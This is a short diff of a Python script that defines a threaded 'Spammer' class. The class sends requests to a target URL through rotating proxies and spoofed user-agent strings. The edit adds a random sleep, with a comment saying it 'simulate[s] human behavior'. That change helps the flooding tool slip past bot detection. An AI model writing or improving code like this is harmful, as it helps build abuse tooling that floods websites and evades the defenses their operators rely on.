@@ -8223,7 +8223,6 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
 			]
 			
-
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8261,7 +8260,7 @@ class Spammer(threading.Thread):
         sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
         sys.stdout.flush()
         sys.stdout.write("\r")
-	    
+
     def run(self):
         global N
         self.Lock.acquire()
@@ -8272,6 +8271,8 @@ class Spammer(threading.Thread):
             try:
                 N += 1
                 self.request()
+                # Add random delay to simulate human behavior
+                time.sleep(random.uniform(0.5, 1.5))
             except:
                 pass
         sys.exit(0)
